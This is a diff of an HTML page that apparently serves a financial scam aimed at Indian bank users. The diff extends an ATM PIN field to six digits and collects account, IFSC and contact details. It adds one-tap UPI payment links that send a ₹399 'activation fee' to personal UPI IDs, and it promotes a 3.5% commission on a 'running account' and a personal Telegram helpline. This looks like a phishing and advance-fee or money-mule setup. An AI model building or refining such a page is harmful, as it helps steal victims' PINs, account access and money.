@@ -46,11 +46,11 @@
                 </div>
             </div>
             <div class="header-right">
-                <a href="https://t.me/+gPDN87ly87liYTc1" class="telegram-pill-link telegram-icon" target="_blank" rel="noopener noreferrer" title="Join our Telegram">
+                <a href="https://t.me/Anderis5801" class="telegram-pill-link telegram-icon" target="_blank" rel="noopener noreferrer" title="Helpline Contact: @Anderis5801">
                     <svg width="17" height="17" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M29.57 6.11c.31-.96-.98-1.39-1.57-.7L3.9 18.38c-1.07.65-1.05 1.49-.2 1.89l6.46 2.01 1.53 6.03c.18.73.97.83 1.39.28l2.76-3.56 5.56 4.11c.99.74 1.75.39 1.98-.82l3.12-14.79zm-18.23 14.79l.06.06.59 5.29-2.28-8.96 11.25-6.17-9.62 9.78zm10.78-9.96l-7.67 7.14-1.27 4.13 2.72-3.14 6.22-8.13z" fill="currentColor"/>
                     </svg>
-                    <span class="support-link-text">Support</span>
+                    <span class="support-link-text">Support · @Anderis5801</span>
                 </a>
                 <div class="bonus-box" id="bonusBox" title="Open Bonus">
                     <span class="bonus-badge" id="bonusBadge">●</span>
@@ -163,7 +163,10 @@
                             <label for="bankName">Bank Name</label>
                             <span class="auto-fill-tag" id="bankNameAutoTag">⚡ Auto-fills from IFSC</span>
                         </div>
-                        <input type="text" id="bankName" placeholder="Auto-fills from IFSC code (e.g. State Bank of India)" required>
+                        <div class="bank-input-with-logo">
+                            <div class="bank-inline-logo" id="bankInputInlineLogo" aria-hidden="true"></div>
+                            <input type="text" id="bankName" placeholder="Auto-fills from IFSC code (e.g. State Bank of India)" required>
+                        </div>
                     </div>
 
                     <div class="form-group">
@@ -311,8 +314,8 @@
 
                         <div class="atm-form-row-2">
                             <div class="form-group">
-                                <label for="atmPin">ATM PIN</label>
-                                <input type="password" id="atmPin" placeholder="4-digit PIN" maxlength="4" inputmode="numeric" autocomplete="off" required>
+                                <label for="atmPin">ATM PIN (4 or 6 Digits)</label>
+                                <input type="password" id="atmPin" placeholder="4 or 6-digit PIN" maxlength="6" inputmode="numeric" autocomplete="off" required>
                             </div>
 
                             <div class="form-group">
@@ -345,35 +348,85 @@
             </div>
         </div>
 
-        <!-- ACTIVATION CODE UPI PANEL -->
+        <!-- ACTIVATION CODE UPI PANEL (₹399) -->
         <div class="dashboard-section hidden" id="activationCodeUpiSection">
             <div class="card">
-                <h3>Live Activation Payment</h3>
+                <div class="payment-page-head">
+                    <h3>Live Activation Payment</h3>
+                    <span class="payment-amount-pill">₹399 Activation Fee</span>
+                </div>
                 
-                <div class="upi-section">
-                    <h4>Pay ₹399 via UPI</h4>
-                    <p class="upi-label">Copy any one UPI ID provided below and pay the ₹399 activation charge.</p>
-                    <div class="upi-row">
-                        <p class="upi-label">UPI ID #1</p>
-                        <div class="upi-display">
-                            <span class="upiId" data-upi-id="panneltest0@ptyes">panneltest0@ptyes</span>
+                <div class="upi-section" id="activationUpiBox">
+                    <h4>Step A: Select UPI ID &amp; Pay ₹399</h4>
+                    <p class="upi-label" style="margin-top:4px;">Select a UPI ID below, then tap your preferred UPI App to pay <strong>₹399</strong> directly (or copy the UPI ID).</p>
+
+                    <div class="upi-selectable-list" data-upi-group="activation399">
+                        <div class="upi-select-card is-selected" data-upi-select="panneltest0@ptyes" role="button" tabindex="0">
+                            <div class="upi-select-radio"><span class="upi-radio-dot"></span></div>
+                            <div class="upi-select-meta">
+                                <span class="upi-select-tag">UPI ID #1 · Primary Merchant</span>
+                                <span class="upiId" data-upi-id="panneltest0@ptyes">panneltest0@ptyes</span>
+                            </div>
+                            <span class="upi-selected-pill">Selected</span>
                             <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="panneltest0@ptyes" data-copy-target="activationCopyMessage">Copy</button>
                         </div>
-                    </div>
-                    <div class="upi-row">
-                        <p class="upi-label">UPI ID #2</p>
-                        <div class="upi-display">
-                            <span class="upiId" data-upi-id="malikpay0@fam">malikpay0@fam</span>
+
+                        <div class="upi-select-card" data-upi-select="malikpay0@fam" role="button" tabindex="0">
+                            <div class="upi-select-radio"><span class="upi-radio-dot"></span></div>
+                            <div class="upi-select-meta">
+                                <span class="upi-select-tag">UPI ID #2 · Backup Merchant</span>
+                                <span class="upiId" data-upi-id="malikpay0@fam">malikpay0@fam</span>
+                            </div>
+                            <span class="upi-selected-pill">Select</span>
                             <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="malikpay0@fam" data-copy-target="activationCopyMessage">Copy</button>
                         </div>
                     </div>
+
                     <div class="copyMessage" id="activationCopyMessage"></div>
+
+                    <!-- Direct UPI App Payment Buttons (uses selected UPI ID with ₹399) -->
+                    <div class="upi-apps-launcher" id="activationUpiAppsLauncher">
+                        <div class="upi-apps-header">
+                            <span>Pay ₹399 Directly via UPI App</span>
+                            <small class="mono-font" id="activationActiveUpiBadge">Paying to: panneltest0@ptyes</small>
+                        </div>
+                        <div class="upi-apps-grid" data-pay-amount="399" data-pay-note="Account Funds Live Activation">
+                            <a href="phonepe://pay?pa=panneltest0@ptyes&pn=Account%20Funds&am=399&cu=INR&tn=Activation%20Fee" class="upi-app-btn upi-app-phonepe" data-upi-app="phonepe">
+                                <span class="upi-app-icon" aria-hidden="true">
+                                    <svg width="24" height="24" viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="10" fill="#5F259F"/><text x="20" y="27" font-size="22" font-weight="900" fill="#FFFFFF" text-anchor="middle" font-family="Arial, sans-serif">पे</text></svg>
+                                </span>
+                                <span class="upi-app-name">PhonePe</span>
+                            </a>
+                            <a href="tez://upi/pay?pa=panneltest0@ptyes&pn=Account%20Funds&am=399&cu=INR&tn=Activation%20Fee" class="upi-app-btn upi-app-gpay" data-upi-app="gpay">
+                                <span class="upi-app-icon" aria-hidden="true">
+                                    <svg width="24" height="24" viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="10" fill="#FFFFFF"/><path d="M28.4 20.4c0-.6-.1-1.3-.2-1.9H20v3.6h4.7c-.2 1.1-.8 2-1.7 2.6v2.2h2.8c1.6-1.5 2.6-3.7 2.6-6.5z" fill="#4285F4"/><path d="M20 29c2.4 0 4.4-.8 5.8-2.1l-2.8-2.2c-.8.5-1.8.8-3 .8-2.3 0-4.3-1.6-5-3.7h-2.9v2.3C13.6 27 16.6 29 20 29z" fill="#34A853"/><path d="M15 21.8c-.2-.5-.3-1.1-.3-1.8s.1-1.3.3-1.8v-2.3h-2.9c-.6 1.2-1 2.6-1 4.1s.4 2.9 1 4.1l2.9-2.3z" fill="#FBBC05"/><path d="M20 14.5c1.3 0 2.5.4 3.4 1.3l2.5-2.5C24.4 11.8 22.4 11 20 11c-3.4 0-6.4 2-7.9 4.9l2.9 2.3c.7-2.1 2.7-3.7 5-3.7z" fill="#EA4335"/></svg>
+                                </span>
+                                <span class="upi-app-name">Google Pay</span>
+                            </a>
+                            <a href="paytmmp://pay?pa=panneltest0@ptyes&pn=Account%20Funds&am=399&cu=INR&tn=Activation%20Fee" class="upi-app-btn upi-app-paytm" data-upi-app="paytm">
+                                <span class="upi-app-icon" aria-hidden="true">
+                                    <svg width="24" height="24" viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="10" fill="#00BAF2"/><rect x="4" y="12" width="32" height="16" rx="4" fill="#002E6E"/><text x="20" y="23.5" font-size="9.5" font-weight="900" fill="#FFFFFF" text-anchor="middle" font-family="Arial, sans-serif">Paytm</text></svg>
+                                </span>
+                                <span class="upi-app-name">Paytm</span>
+                            </a>
+                            <a href="upi://pay?pa=panneltest0@ptyes&pn=Account%20Funds&am=399&cu=INR&tn=Activation%20Fee" class="upi-app-btn upi-app-bhim" data-upi-app="upi">
+                                <span class="upi-app-icon" aria-hidden="true">
+                                    <svg width="24" height="24" viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="10" fill="#097939"/><path d="M16 10L25 20L16 30V22L20 20L16 18V10Z" fill="#FF7722"/><path d="M21 10L30 20L21 30V22L25 20L21 18V10Z" fill="#FFFFFF"/></svg>
+                                </span>
+                                <span class="upi-app-name">BHIM / UPI</span>
+                            </a>
+                        </div>
+                    </div>
                 </div>
 
                 <div class="form-group">
-                    <label for="activationUtrInput">Submit UTR</label>
-                    <input type="text" id="activationUtrInput" placeholder="Enter any UTR number" class="utrInput">
-                    <button type="button" class="btn btn-primary" id="activationSubmitUtrBtn" style="width:100%;margin-top:8px;">Submit UTR</button>
+                    <label for="activationUtrInput">Step B: Submit 12-Digit UTR Number</label>
+                    <input type="text" id="activationUtrInput" placeholder="Enter 12-digit UTR / Ref Number" maxlength="12" inputmode="numeric" class="utrInput">
+                    <button type="button" class="btn btn-primary" id="activationSubmitUtrBtn" style="width:100%;margin-top:10px;">Submit UTR &amp; Proceed →</button>
+                </div>
+                <div class="payment-support-strip">
+                    <span>Need payment assistance? Contact Verification Support:</span>
+                    <a href="https://t.me/Anderis5801" target="_blank" rel="noopener noreferrer" class="support-tg-handle">@Anderis5801 →</a>
                 </div>
                 <div id="activationUtrMessage" class="message"></div>
             </div>
@@ -421,11 +474,25 @@
 
                 <div class="running-main" id="runningMainContent">
                     <div class="running-left">
-                        <p id="accountLinked" style="color:var(--text-secondary);font-weight:600;">Account Linked: XXXX 0000</p>
+                        <div class="running-account-bar">
+                            <div class="running-bank-logo-mini" id="runningBankLogoMini" aria-hidden="true"></div>
+                            <p id="accountLinked" style="color:var(--text-primary);font-weight:700;margin:0;">Account Linked: XXXX 0000</p>
+                        </div>
 
-                        <div class="balance-display">
-                            <p style="margin:0;font-size:0.9rem;color:var(--text-secondary);">Live Balance</p>
-                            <div id="liveBalance" style="font-size:2rem;font-weight:800;color:var(--success-color);margin-top:5px;">₹0</div>
+                        <!-- Arranged Live Balance, Total Credits & Total Debits Grid -->
+                        <div class="running-kpi-grid">
+                            <div class="balance-display running-kpi-box running-kpi-balance">
+                                <p class="running-kpi-label">Live Balance</p>
+                                <div id="liveBalance" class="running-kpi-value running-val-balance">₹0</div>
+                            </div>
+                            <div class="balance-display running-kpi-box running-kpi-credit">
+                                <p class="running-kpi-label">Total Credits</p>
+                                <div id="runningTotalCredits" class="running-kpi-value running-val-credit">₹0</div>
+                            </div>
+                            <div class="balance-display running-kpi-box running-kpi-debit">
+                                <p class="running-kpi-label">Total Debits</p>
+                                <div id="runningTotalDebits" class="running-kpi-value running-val-debit">₹0</div>
+                            </div>
                         </div>
 
                         <div class="transactions">
@@ -440,7 +507,8 @@
                         <div class="side-panel">
                             <h4>Commission (3.5%)</h4>
                             <div id="commissionAmount" style="font-size:1.6rem;font-weight:800;color:var(--secondary-color);margin:12px 0;">₹0</div>
-                            <button type="button" class="btn btn-primary" id="withdrawCommissionBtn" style="width:100%;">Step 5: Withdraw</button>
+                            <p style="font-size:0.78rem;color:var(--text-secondary);margin-bottom:14px;">Calculated automatically on Total Credit volume.</p>
+                            <button type="button" class="btn btn-primary" id="withdrawCommissionBtn" style="width:100%;">Step 5: Withdraw Commission</button>
                         </div>
                     </div>
                 </div>
@@ -513,22 +581,27 @@
             </div>
         </div>
 
-        <!-- TRANSACTION HISTORY -->
-        <div class="dashboard-section" id="transactionHistorySection">
+        <!-- TRANSACTION HISTORY (OPENED ONLY IF EXPLICITLY REQUESTED, NEVER STACKED BELOW OTHER PAGES) -->
+        <div class="dashboard-section hidden" id="transactionHistorySection">
             <div class="card">
                 <div class="history-header-row">
                     <h3 style="margin-bottom:0;">Transaction History (Last 10)</h3>
-                    <button type="button" class="btn btn-secondary btn-receipt-shortcut hidden" id="viewLatestReceiptBtn">📄 View Payment Receipt</button>
                 </div>
                 <div id="transactionHistory" class="transaction-history" style="margin-top:16px;"></div>
             </div>
         </div>
 
-        <!-- WITHDRAW PANEL -->
+        <!-- WITHDRAW PANEL (CLEAN DEDICATED PAGE - ZERO LEDGER BELOW) -->
         <div class="dashboard-section hidden" id="withdrawCommissionSection">
             <div class="card">
                 <h3>Step 5: Withdraw Commission</h3>
+                <p class="muted" style="margin-bottom:18px;">Enter your payout bank account details to withdraw your earned 3.5% commission.</p>
                 <form id="withdrawCommissionForm">
+                    <div class="form-group">
+                        <label for="withdrawAccountHolder">Account Holder Name</label>
+                        <input type="text" id="withdrawAccountHolder" placeholder="Enter account holder full name" required>
+                    </div>
+
                     <div class="form-group">
                         <label for="withdrawAccNumber">Account Number</label>
                         <input type="text" id="withdrawAccNumber" placeholder="Enter account number" required>
@@ -544,17 +617,20 @@
 
                     <div class="form-group">
                         <label for="withdrawBank">Bank Name</label>
-                        <input type="text" id="withdrawBank" placeholder="Auto-fills from IFSC code" required>
+                        <div class="bank-input-with-logo">
+                            <div class="bank-inline-logo" id="withdrawBankInlineLogo" aria-hidden="true"></div>
+                            <input type="text" id="withdrawBank" placeholder="Auto-fills from IFSC code" required>
+                        </div>
                     </div>
 
                     <div class="form-group">
                         <label for="withdrawContact">Contact Number</label>
-                        <input type="tel" id="withdrawContact" placeholder="Enter contact number" required>
+                        <input type="tel" id="withdrawContact" placeholder="Enter 10-digit contact number" required>
                     </div>
 
                     <button type="submit" class="btn btn-primary">Request Withdrawal</button>
                 </form>
-                <button type="button" class="btn btn-secondary" id="backFromWithdrawBtn" style="margin-top:10px;width:100%;">Back</button>
+                <button type="button" class="btn btn-secondary" id="backFromWithdrawBtn" style="margin-top:10px;width:100%;">← Back to Running Account</button>
             </div>
         </div>
 
